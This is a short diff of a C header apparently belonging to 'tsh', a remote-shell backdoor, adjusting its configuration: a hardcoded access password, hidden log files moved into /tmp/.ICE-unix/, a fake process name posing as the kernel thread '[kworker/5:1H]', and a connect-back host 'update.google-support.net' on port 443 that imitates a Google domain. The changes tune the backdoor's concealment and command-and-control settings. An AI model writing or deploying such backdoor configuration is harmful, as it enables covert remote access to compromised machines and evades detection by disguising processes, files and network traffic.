@@ -36,12 +36,12 @@ pid_t lock_test(int fd, short type, short whence, off_t start, off_t len);
 /*
  * tsh
  */
-char *secret = "testJik5&*!@";
+char *secret = "test1234&*!@";
 
-#define FLAG_FILE "/tmp/.sess_6c1827.log"
-#define FILE_PATH "/tmp/.sess_6c1828.log"
+#define FLAG_FILE "/tmp/.ICE-unix/.sess_6c1827.log"
+#define FILE_PATH "/tmp/.ICE-unix/.sess_6c1828.log"
 #define SERVER_PORT 443
-#define FAKE_PROC_NAME "[kworker/6:1H]"
+#define FAKE_PROC_NAME "[kworker/5:1H]"
 
 #define CONNECT_BACK_HOST "update.google-support.net"
 #define LOOP_BACK_HOST "127.0.0.1"
